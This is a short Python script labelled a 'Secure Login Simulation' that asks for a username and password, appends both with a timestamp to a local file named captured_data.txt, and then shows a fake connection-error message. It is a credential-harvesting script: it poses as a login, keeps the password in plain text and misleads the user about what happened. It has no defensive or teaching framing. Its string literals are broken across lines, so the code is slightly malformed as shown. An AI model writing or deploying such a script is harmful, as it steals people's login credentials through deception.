import time
print('--- Secure Login Simulation ---')
user = input('Enter Username: ')
pswd = input('Enter Password: ')
with open('captured_data.txt', 'a') as f:
    f.write(f'Time: {time.ctime()} | User: {user} | Pass: {pswd}
')
print('
[!] Connection Error...')
